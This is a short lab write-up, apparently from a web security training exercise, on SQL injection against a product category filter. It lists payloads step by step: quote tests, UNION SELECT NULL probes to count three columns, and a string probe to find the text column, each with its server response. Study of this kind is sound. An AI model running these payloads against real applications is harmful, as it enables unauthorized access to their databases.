# SQL injection, finding a column containing text

### Goal:
`Get the application to return an additional row that contains 'xxxXXX'`
### Info: The injection point is the product category filter
`target.com/filter?category=<input>`

<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`<br><br>

category='--

`200`
<br><br>

**<ins>Step 2: Enumerate data output with UNION attack</ins>**

category='UNION SELECT NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,NULL--

`500`<br><br>

category='UNION SELECT NULL,NULL,NULL--

`200`

This means that the database returns three columns.<br><br>

category=' UNION SELECT 'xxxXXX',NULL,NULL--

`500 server error`<br><br>

category='UNION SELECT NULL,'xxxXXX',NULL--

`200`<br><br>

This means that the second column can output strings.